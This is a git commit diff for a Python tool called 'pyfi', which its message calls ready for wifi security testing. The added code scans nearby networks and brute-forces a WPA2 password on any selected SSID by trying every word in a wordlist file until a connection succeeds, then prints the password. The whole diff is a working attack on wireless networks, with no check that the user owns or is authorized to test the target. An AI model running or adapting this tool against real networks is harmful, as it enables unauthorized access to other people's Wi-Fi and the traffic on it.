c6fd2da1ceb19c83f3185764544b8db7595ededf
mohamed <mohamedhathim628@gmail.com>
2024-09-30 20:01:33 +0530

    Finally, tool ready for wifi security testing

--- pyfi/pyfi.py
+++ pyfi/pyfi.py
@@ -1,7 +1,8 @@
-import time
 from pywifi import const
 import pywifi
 import sys
+from time import sleep
+from os import system
 
 
 # for printing help
@@ -13,7 +14,7 @@ def print_help(args):
 
 
 available_devices = []
-final_password = []
+final_password = ""
 
 # initialize pywifi
 init_pyfi = pywifi.PyWiFi()
@@ -23,47 +24,62 @@ interfaces = init_pyfi.interfaces()[0]
 
 # Scan wireless WI-FI devices of our device and print it.
 interfaces.scan()
-all_network_device = interfaces.scan_results()
 
-def connector(interface_ssid):
+devices = interfaces.scan_results()
+
+for all_dev in devices:
+    available_devices.append(all_dev.ssid)
+
+
+def connector(interface_ssid, wordlist) -> str:
     if interfaces.status() == const.IFACE_CONNECTED:
-        interfaces.disconnect()
-        time.sleep(1)
-        profile = pywifi.Profile()
-        profile.ssid = interface_ssid
-        profile.auth = const.AUTH_ALG_OPEN
-        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        print("Network already connected\n")
+        sys.exit()
 
-        pass_file = open("list.txt", "r")
-        text_file = pass_file.read()
+    else:
+        network_profile = pywifi.Profile()
+        network_profile.ssid = interface_ssid
+        network_profile.key = wordlist
+        network_profile.auth = const.AUTH_ALG_OPEN
+        network_profile.cipher = const.CIPHER_TYPE_CCMP
+        network_profile.akm.append(const.AKM_TYPE_WPA2PSK)
 
-        for passw in text_file:
-            profile.key = passw
+        interfaces.remove_all_network_profiles()
+        tmp_profile = interfaces.add_network_profile(network_profile)
 
-            if profile.key == passw:
-                final_password.append(passw)
-                print(str(final_password))
+        interfaces.connect(tmp_profile)
+        sleep(4)
+
+        if interfaces.status() == const.IFACE_CONNECTED:
+            print(f"Password found : {wordlist}")
+            print("Network connected successfully\n")
+            sys.exit()
+        else:
+            print(f"Password \'{wordlist}\' is incorrect in interface -> {interface_ssid}")
+
+
+def bruteforce(interface):
+    with open("list", "r") as file:
+
+        for wordlst in file.readlines():
+            wordlst = wordlst.strip()
+
+            if connector(interface,wordlst):
                 break
-            else:
-                pass
 
 
 def main():
     if sys.argv[1] == "-i" or sys.argv[1] == "--interfaces":
-        for all_devs in all_network_device:
+        for all_devs in devices:
             print("Network name :{}".format(all_devs.ssid))
             print("Network bssid :{}".format(all_devs.bssid))
             print("Network akm :{}".format(all_devs.akm))
             print("Network cipher :{}".format(all_devs.cipher))
 
     elif sys.argv[1] == "-s" or sys.argv[1] == "--scan":
-        devices = interfaces.scan_results()
-        for all_dev in devices:
-            available_devices.append(all_dev.ssid)
-            # remove_duplicate = duplicate_finder(available_devices)
         print(str(available_devices))
-    elif sys.argv[1] == "-c" and sys.argv[2] or sys.argv[1] == "--connect" and sys.argv[2]:
-        connector(sys.argv[2])
+    elif sys.argv[1] == "-c" and sys.argv[2] in available_devices or sys.argv[1] == "--connect" and sys.argv[2] in available_devices:
+        bruteforce(sys.argv[2])
     elif sys.argv[1] == "-c" and not sys.argv[2] or sys.argv[1] == "--connect" and not sys.argv[2]:
         print_help(sys.argv[0])
         print("interface name not specified\n")
@@ -71,5 +87,9 @@ def main():
         print_help(sys.argv[0])
         print("Invalid command\n")
 
-main()
+
+if __name__ == "__main__":
+    main()
+
+
 
